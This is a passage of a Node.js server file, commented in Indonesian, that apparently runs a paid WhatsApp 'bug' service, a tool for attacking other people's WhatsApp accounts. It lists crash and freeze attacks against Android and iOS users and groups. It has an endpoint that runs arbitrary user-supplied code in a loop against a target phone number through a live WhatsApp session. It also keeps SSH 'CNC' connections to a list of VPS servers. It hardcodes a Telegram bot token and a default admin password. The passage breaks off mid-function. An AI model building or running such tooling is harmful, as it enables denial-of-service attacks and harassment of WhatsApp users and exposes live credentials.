const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

// Konfigurasi debug
const DEBUG = false; // Set false di production untuk mengurangi log

// Fungsi log terkontrol
function logDebug(...args) {
  if (DEBUG) {
    console.log(...args);
  }
}

function logInfo(...args) {
  console.log(...args);
}

function logError(...args) {
  console.error(...args);
}

process.on('unhandledRejection', (reason, promise) => {
  logError('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  logError('Uncaught Exception:', err);
});

// Filter pesan yang tidak perlu di log
process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require("@otaxayuns/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const compression = require('compression');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const chalk = require('chalk');

// Konfigurasi
const PORT = 2002;
const WS_PORT = 2002;
const MAX_WS_CONNECTIONS = 1000;
let activeWsConnections = 0;
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "delay_hard", bug_name: "𝐃𝐄𝐋𝐀𝐘 𝐈𝐍𝐕𝐈𝐒 𝐇𝐀𝐑𝐃 [ 𝐍𝐔𝐌𝐁𝐄𝐑 ]" },
  { bug_id: "delay_spam", bug_name: "𝐃𝐄𝐋𝐀𝐘 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 [ 𝐍𝐔𝐌𝐁𝐄𝐑 ]" },
  { bug_id: "android", bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐂𝐋𝐈𝐂𝐊 𝐀𝐍𝐃𝐑𝐎 [ 𝐍𝐔𝐌𝐁𝐄𝐑 ]" },
  { bug_id: "frezexstuk_ios", bug_name: "𝐅𝐑𝐄𝐙𝐄 𝐗 𝐒𝐓𝐔𝐊 𝐋𝐎𝐆𝐎 𝐈𝐎𝐒 [ 𝐍𝐔𝐌𝐁𝐄𝐑 ]" },
  { bug_id: "fc_ios", bug_name: "𝐅𝐎𝐑𝐂𝐄 𝐂𝐋𝐎𝐒𝐄 𝐈𝐎𝐒 [ 𝐍𝐔𝐌𝐁𝐄𝐑 ]" },
];

// Versi bug khusus untuk group (RINGAN)
const groupBugs = [
  { bug_id: "group_blank", bug_name: "𝐁𝐋𝐀𝐍𝐊 𝐇𝐀𝐑𝐃 [ 𝐆𝐑𝐎𝐔𝐏 ]" },
  { bug_id: "group_delay", bug_name: "𝐃𝐄𝐋𝐀𝐘 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 [ 𝐆𝐑𝐎𝐔𝐏 ]" },
];

let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));

// Cache untuk database
const dbCache = new Map();
const CACHE_TTL = 30000; // 30 detik

// Cooldown maps
const bugCooldown = new Map();
const spamCooldown = {};
const cooldowns = {};
const rateLimitMap = {};

// Load data awal
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

fs.watchFile("keyList.json", () => {
  logDebug("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

// Fungsi helper
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Telegram Bot
const TOKEN = "8977286605:AAHcDxYijs0svjs3RhvTFg3H9ipGZTzoIEc";
const bot = new TelegramBot(TOKEN, { polling: true });
const DEVELOPER_ID = 8859317140; // ID Telegram Developer
const OWNER_ID = 8859317140; // Sama dengan DEVELOPER_ID

// WebSocket Server dengan limit koneksi
wss.on('connection', function (ws, req) {
  if (activeWsConnections >= MAX_WS_CONNECTIONS) {
    ws.close(1008, 'Server overload');
    return;
  }
  
  activeWsConnections++;
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member",
          bitcoin: session.bitcoin || 0,
          stars: session.stars || 0
        }));
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      logError("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    activeWsConnections--;
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Start server
server.listen(WS_PORT, () => {
  logInfo(`🟣 Server running on http://localhost:${WS_PORT}`);
});

// Middleware
app.use(compression());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Timeout middleware
app.use((req, res, next) => {
  req.setTimeout(5000, () => {
    res.status(408).json({ error: "Request timeout" });
  });
  next();
});

// Rate limiter dengan perbaikan
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabaseCached();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    logDebug(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Load active keys
if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    logDebug("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    logError("❌ Failed to load keyList.json:", err.message);
  }
}

// VPS Functions
function connectToAllVPS() {
  if (!cncActive) return;

  logDebug("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      logDebug(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      logDebug(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        logDebug(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          logDebug(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      logDebug(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  logDebug("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  logDebug("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    logDebug("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    logError("❌ Failed to update VPS list:", e.message);
  }
});

// Database functions dengan cache
function loadDatabaseCached() {
  const now = Date.now();
  const cached = dbCache.get('database');
  
  if (cached && (now - cached.timestamp < CACHE_TTL)) {
    return cached.data;
  }
  
  const data = loadDatabase();
  dbCache.set('database', { data, timestamp: now });
  return data;
}

function saveDatabaseCached(data) {
  saveDatabase(data);
  dbCache.set('database', { data, timestamp: Date.now() });
}

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    // Buat database dengan akun developer default
    const defaultDatabase = [
      {
        telegramId: DEVELOPER_ID,
        username: "gupong",
        password: "pong",
        role: "developer",
        expiredDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        bitcoin: 999999,
        stars: 999999,
        createdAt: new Date().toISOString(),
        status: 'active'
      }
    ];
    
    fs.writeFileSync(DB_PATH, JSON.stringify(defaultDatabase, null, 2));
    logDebug("[🗃️ DB] Database baru dibuat dengan akun developer default.");
    return defaultDatabase;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    
    // Pastikan setiap user memiliki field yang diperlukan
    const validatedData = data.map(user => ({
      ...user,
      bitcoin: user.bitcoin || 0,
      stars: user.stars || 0,
      status: user.status || 'active',
      createdAt: user.createdAt || new Date().toISOString()
    }));
    
    // Jika ada perubahan, simpan kembali
    if (JSON.stringify(data) !== JSON.stringify(validatedData)) {
      saveDatabase(validatedData);
    }
    
    return validatedData;
  } catch (error) {
    logError("[❌ DB] Error membaca database:", error.message);
    // Kembalikan database default jika error
    return [
      {
        telegramId: DEVELOPER_ID,
        username: "gupong",
        password: "pong",
        role: "developer",
        expiredDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        bitcoin: 999999,
        stars: 999999,
        createdAt: new Date().toISOString(),
        status: 'active'
      }
    ];
  }
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  logDebug("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  logDebug(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo?.username);
  return user ? keyInfo.username : null;
}

// Endpoint debug - HANYA UNTUK TESTING
app.get("/debug/check-global", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
  
  const globalFolder = path.join('permenmd', 'global');
  const result = {
    globalFolderExists: fs.existsSync(globalFolder),
    globalSenders: []
  };
  
  if (fs.existsSync(globalFolder)) {
    const jsonFiles = fs.readdirSync(globalFolder).filter(f => f.endsWith('.json'));
    for (const file of jsonFiles) {
      const sessionName = path.basename(file, '.json');
      result.globalSenders.push({
        name: sessionName,
        active: activeConnections[sessionName] ? true : false
      });
    }
  }
  
  res.json(result);
});

// Endpoint untuk refresh sender
app.get("/refreshSenders", async (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || (user.role !== 'owner' && user.role !== 'developer')) {
    return res.status(403).json({ error: "Access denied" });
  }
  
  try {
    logInfo(`[REFRESH] Refreshing all senders...`);
    
    // Refresh global senders
    await startGlobalSenders();
    
    // Refresh user senders
    await startUserSessions();
    
    setTimeout(() => {
      debugSenderStatus();
    }, 3000);
    
    return res.json({ 
      success: true, 
      message: "Senders refreshed",
      personal: getPersonalSenderCount(user.username),
      global: getGlobalSenderCount()
    });
  } catch (error) {
    logError(`[REFRESH] Error: ${error.message}`);
    return res.status(500).json({ error: error.message });
  }
});

// API Routes
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.get('/transferCoins', (req, res) => {
  const { key, target, password, amount, type } = req.query;

  const senderUsername = getUserByKey(key);
  if (!senderUsername) return res.json({ success: false, message: "Sesi Invalid." });

  const db = loadDatabaseCached();
  const sender = db.find(u => u.username === senderUsername);

  if (!sender || sender.password !== password) {
    return res.json({ success: false, message: "Password Salah!" });
  }

  const receiver = db.find(u => u.username === target);
  if (!receiver) return res.json({ success: false, message: "Target tidak ditemukan." });

  if (sender.username === receiver.username) return res.json({ success: false, message: "Tidak bisa transfer ke diri sendiri." });

  const valAmount = parseInt(amount);
  if (isNaN(valAmount) || valAmount <= 0) return res.json({ success: false, message: "Jumlah tidak valid." });

  const currency = type.toLowerCase(); 

  if (currency === 'bitcoin' || currency === 'coin') {
    const senderBal = sender.bitcoin || 0;
    if (senderBal < valAmount) return res.json({ success: false, message: "Saldo Bitcoin Kurang." });
    
    sender.bitcoin = senderBal - valAmount;
    receiver.bitcoin = (receiver.bitcoin || 0) + valAmount;
  } else if (currency === 'stars' || currency === 'star') {
    const senderBal = sender.stars || 0;
    if (senderBal < valAmount) return res.json({ success: false, message: "Saldo Stars Kurang." });
    
    sender.stars = senderBal - valAmount;
    receiver.stars = (receiver.stars || 0) + valAmount;
  } else {
    return res.json({ success: false, message: "Tipe coin salah." });
  }

  saveDatabaseCached(db);
  
  const msg = `[💸] ${sender.username} tf ${valAmount} ${currency} to ${receiver.username}`;
  logDebug(msg);
  fs.appendFileSync('logUser.txt', msg + '\n');

  res.json({ success: true, message: "Transfer Berhasil!" });
});

// ================== TEST FUNCTION API ==================
app.post("/testFunc", async (req, res) => {
    const { key, target, loop, function: funcCode } = req.body;
    
    logDebug(`[🔧 TESFUNC] Request from key: ${key}, target: ${target}, loop: ${loop}`);
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.status(401).json({ success: false, message: "Invalid session key" });
    }
    
    const db = loadDatabaseCached();
    const user = db.find(u => u.username === keyInfo.username);
    
    if (!user || !["owner", "developer", "vip", "reseller", "member"].includes(user.role)) {
        return res.status(403).json({ success: false, message: "Access denied" });
    }
    
    // Validasi input
    if (!target || !funcCode) {
        return res.status(400).json({ success: false, message: "Missing target or function code" });
    }
    
    const loopCount = parseInt(loop) || 1;
    if (loopCount < 1 || loopCount > 50) {
        return res.status(400).json({ success: false, message: "Loop must be between 1-50" });
    }
    
    // Cari socket yang aktif untuk user ini
    const sock = await getSocketForUser(user.username);
    if (!sock) {
        return res.status(500).json({ 
            success: false, 
            message: "No active WhatsApp session found. Please pair a sender first." 
        });
    }
    
    const targetJid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;
    
    try {
        // Validate function code
        if (!funcCode.includes("async function") && !funcCode.includes("function")) {
            return res.status(400).json({ 
                success: false, 
                message: "Function must contain 'async function' or 'function' declaration" 
            });
        }
        
        // Execute the function
        const result = await executeTestFunction(sock, targetJid, funcCode, loopCount);
        
        logDebug(`[✅ TESFUNC] Successfully executed ${result.successCount}/${loopCount} iterations`);
        
        return res.json({
            success: true,
            message: `Executed ${result.successCount}/${loopCount} iterations successfully`,
            successCount: result.successCount,
            totalCount: loopCount,
            errors: result.errors
        });
        
    } catch (error) {
        logError(`[❌ TESFUNC ERROR]`, error.message);
        return res.status(500).json({
            success: false,
            message: `Execution error: ${error.message}`
        });
    }
});

app.get("/checkAccountStatus", (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ error: "Invalid session key" });
  }
  
  const db = loadDatabaseCached();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ 
      success: false, 
      message: "User tidak ditemukan" 
    });
  }
  
  // Hitung sisa hari
  const expired = new Date(user.expiredDate);
  const now = new Date();
  const daysLeft = Math.ceil((expired - now) / (1000 * 60 * 60 * 24));
  
  res.json({
    success: true,
    username: user.username,
    role: user.role,
    expiredDate: user.expiredDate,
    daysLeft: daysLeft,
    bitcoin: user.bitcoin || 0,
    stars: user.stars || 0,
    status: daysLeft > 0 ? "active" : "expired"
  });
});

// ================== FUNGSI BANTUAN UNTUK EKSEKUSI KODE ==================

// Fungsi untuk execute test function yang sudah diperbaiki
async function executeTestFunction(sock, targetJid, funcCode, loopCount) {
    logDebug(`[🔧 TESFUNC] Executing function ${loopCount} times to ${targetJid}`);
    
    let successCount = 0;
    let errors = [];
    
    try {
        // 1. Cari semua nama fungsi dalam kode
        const functionNames = [];
        const patterns = [
            /(?:async\s+)?function\s+(\w+)\s*\(/g,
            /const\s+(\w+)\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/g,
            /let\s+(\w+)\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/g,
            /var\s+(\w+)\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/g
        ];
        
        for (const pattern of patterns) {
            let match;
            while ((match = pattern.exec(funcCode)) !== null) {
                if (match[1] && !functionNames.includes(match[1])) {
                    functionNames.push(match[1]);
                }
            }
        }
        
        logDebug(`[🔧 TESFUNC] Found functions: ${JSON.stringify(functionNames)}`);
        
        if (functionNames.length === 0) {
            throw new Error('No function declaration found in code');
        }
        
        // 2. Buat semua dependencies WhatsApp yang diperlukan
        const whatsAppDeps = {
            // Core WhatsApp functions
            generateWAMessageFromContent,
            generateWAMessage,
            generateMessageID,
            prepareWAMessageMedia,
            patchMessageBeforeSending,
            generateForwardMessageContent,
            
            // WhatsApp protos and types
            proto,
            WAMessageProto,
            WAProto,
            WAProto_1,
            MessageType,
            Mimetype,
            MimetypeMap,
            MediaType,
            WAMessageStatus,
            WA_MESSAGE_STATUS_TYPE,
            WA_MESSAGE_STUB_TYPES,
            WA_DEFAULT_EPHEMERAL,
            WAFlag,
            WAUrlInfo,
            WAMediaUpload,
            WANode,
            WAMetric,
            WALocationMessage,
            WAContextInfo,
            WAContactMessage,
            WAContactsArrayMessage,
            WAGroupInviteMessage,
            WATextMessage,
            WAMessageContent,
            WAMessage,
            WAGroupMetadata,
            MessageTypeProto,
            MessageOptions,
            AnyMessageContent,
            MiscMessageGenerationOptions,
            MediaConnInfo,
            ReconnectMode,
            ChatModification,
            GroupSettingChange,
            DisconnectReason,
            Presence,
            Browser,
            Browsers,
            
            // WhatsApp utilities
            jidDecode,
            jidEncode,
            mentionedJid,
            areJidsSameUser,
            processTime,
            getContentType,
            encodeWAMessage,
            encodeNewsletterMessage,
            getAggregateVotesInPollMessage,
            getStream,
            getButtonType,
            waChatKey,
            MediaPathMap,
            URL_REGEX,
            
            // Additional dependencies
            chalk,
            BaileysError,
            baileys,
            AuthenticationState,
            GroupMetadata,
            initInMemoryKeyStore,
            useMultiFileAuthState,
            useSingleFileAuthState,
            BufferJSON,
            ProxyAgent,
            extendedTextMessage,
            relayWAMessage,
            listMessage,
            templateMessage,
            encodeSignedDeviceIdentity,
            WAMessageAddressingMode,
            downloadContentFromMessage,
            downloadAndSaveMediaMessage,
            emitGroupParticipantsUpdate,
            emitGroupUpdate,
            makeMessagesSocket,
            fetchLatestWaWebVersion,
            interactiveMessage,
            fetchLatestBaileysVersion,
            makeCacheableSignalKeyStore,
            MessageRetryMap,
            
            // Tambahan fungsi penting dari sock object
            sleep, // fungsi sleep helper
            logDebug, // fungsi log
            logError // fungsi error log
        };
        
        // 3. Execute untuk setiap loop
        for (let i = 0; i < loopCount; i++) {
            try {
                logDebug(`[🔧 TESFUNC] Starting iteration ${i + 1}/${loopCount}`);
                
                // Buat sandbox khusus untuk setiap iterasi
                const sandbox = {
                    // WhatsApp dependencies
                    ...whatsAppDeps,
                    
                    // Socket object dengan semua methodnya
                    sock: {
                        // Core methods
                        relayMessage: (...args) => sock.relayMessage(...args),
                        sendMessage: (...args) => sock.sendMessage(...args),
                        updateBlockStatus: (...args) => sock.updateBlockStatus?.(...args),
                        offerCall: (...args) => sock.offerCall?.(...args),
                        profilePictureUrl: (...args) => sock.profilePictureUrl?.(...args),
                        fetchStatus: (...args) => sock.fetchStatus?.(...args),
                        onWhatsApp: (...args) => sock.onWhatsApp?.(...args),
                        groupAcceptInvite: (...args) => sock.groupAcceptInvite?.(...args),
                        groupMetadata: (...args) => sock.groupMetadata?.(...args),
                        groupLeave: (...args) => sock.groupLeave?.(...args),
                        
                        // Authentication
                        authState: sock.authState,
                        ev: sock.ev,
                        ws: sock.ws,
                        user: sock.user,
                        
                        // Message generation helpers
                        generateMessageTag: () => sock.generateMessageTag?.(),
                        
                        // Copy semua properti socket
                        ...sock
                    },
                    
                    // Target JID
                    targetJid: targetJid,
                    
                    // System functions
                    console: {
                        log: (...args) => logDebug(`[FUNC ${i+1} LOG]`, ...args),
                        error: (...args) => logError(`[FUNC ${i+1} ERROR]`, ...args),
                        warn: (...args) => logDebug(`[FUNC ${i+1} WARN]`, ...args),
                        info: (...args) => logDebug(`[FUNC ${i+1} INFO]`, ...args)
                    },
                    
                    // Async/await support
                    async: true,
                    await: true,
                    
                    // JavaScript built-ins
                    setTimeout: (fn, ms) => setTimeout(fn, ms),
                    clearTimeout,
                    setInterval,
                    clearInterval,
                    Promise,
                    Date,
                    Math,
                    JSON,
                    Object,
                    Array,
                    String,
                    Number,
                    Boolean,
                    Error,
                    RegExp,
                    Map,
                    Set,
                    WeakMap,
                    WeakSet,
                    Symbol,
                    
                    // Buffer support
                    Buffer: {
                        from: Buffer.from,
                        alloc: Buffer.alloc,
                        allocUnsafe: Buffer.allocUnsafe,
                        allocUnsafeSlow: Buffer.allocUnsafeSlow,
                        byteLength: Buffer.byteLength,
                        compare: Buffer.compare,
                        concat: Buffer.concat,
                        copy: Buffer.copy,
                        fill: Buffer.fill,
                        includes: Buffer.includes,
                        indexOf: Buffer.indexOf,
                        isBuffer: Buffer.isBuffer,
                        isEncoding: Buffer.isEncoding,
                        lastIndexOf: Buffer.lastIndexOf,
                        poolSize: Buffer.poolSize,
                        toBuffer: Buffer.toBuffer
                    },
                    
                    // Crypto jika dibutuhkan
                    crypto: require('crypto'),
                    
                    // VM context untuk evaluasi
                    vm: require('vm')
                };
                
                // Tambahkan semua fungsi dari sock object ke sandbox
                Object.getOwnPropertyNames(Object.getPrototypeOf(sock)).forEach(key => {
                    if (typeof sock[key] === 'function' && key !== 'constructor') {
                        if (!sandbox.sock[key]) {
                            sandbox.sock[key] = (...args) => sock[key](...args);
                        }
                    }
                });
                
                // Buat kode yang akan dieksekusi
                const userCode = `
                    try {
                        // Deklarasi fungsi user
                        ${funcCode}
                        
                        // Cari fungsi yang dapat dieksekusi
                        let funcToExecute = null;
                        const functionNames = ${JSON.stringify(functionNames)};
                        
                        for (const funcName of functionNames) {
                            if (typeof eval(funcName) === 'function') {
                                funcToExecute = eval(funcName);
                                break;
                            }
                        }
                        
                        if (!funcToExecute) {
                            // Coba cari fungsi dengan evaluasi langsung
                            const funcMatch = ${JSON.stringify(funcCode)}.match(/(?:async\\s+)?function\\s+([\\w$]+)\\s*\\(|(?:const|let|var)\\s+([\\w$]+)\\s*=\\s*(?:async\\s+)?\\(/);
                            if (funcMatch) {
                                const funcName = funcMatch[1] || funcMatch[2];
                                funcToExecute = eval(funcName);
                            }
                        }
                        
                        if (!funcToExecute || typeof funcToExecute !== 'function') {
                            throw new Error('No executable function found in code');
                        }
                        
                        // Cek jumlah parameter
                        const paramString = funcToExecute.toString().match(/\\(([^)]*)\\)/)[1];
                        const paramCount = paramString.split(',').filter(p => p.trim()).length;
                        
                        // Execute fungsi dengan parameter yang sesuai
                        let result;
                        if (paramCount >= 2) {
                            result = await funcToExecute(sock, targetJid);
                        } else if (paramCount === 1) {
                            result = await funcToExecute(sock);
                        } else {
                            result = await funcToExecute();
                        }
                        
                        return { success: true, result: result };
                        
                    } catch (error) {
                        // Tangkap error dan kembalikan
                        return { 
                            success: false, 
                            error: error.message,
                            stack: error.stack
                        };
                    }
                `;
                
                // Create VM context dan execute
                const vmContext = vm.createContext(sandbox);
                const script = new vm.Script(userCode);
                
                // Eksekusi dengan timeout
                const executionPromise = script.runInContext(vmContext, { 
                    timeout: 30000, // 30 detik timeout
                    displayErrors: true 
                });
                
                // Handle promise dengan timeout
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Execution timeout after 30 seconds')), 30000)
                );
                
                const result = await Promise.race([executionPromise, timeoutPromise]);
                
                if (result.success) {
                    successCount++;
                    logDebug(`[✅ TESFUNC] Iteration ${i + 1} completed successfully`);
                    
                    // Log result jika ada
                    if (result.result !== undefined) {
                        logDebug(`[📊 TESFUNC] Result from iteration ${i + 1}:`, 
                            typeof result.result === 'object' ? JSON.stringify(result.result, null, 2) : result.result);
                    }
                } else {
                    logError(`[⚠️ TESFUNC] Iteration ${i + 1} failed:`, result.error);
                    errors.push(`Iteration ${i + 1}: ${result.error}`);
                }
                
                // Delay antara iterasi (2 detik)
                if (i < loopCount - 1) {
                    await sleep(2000);
                }
                
            } catch (iterError) {
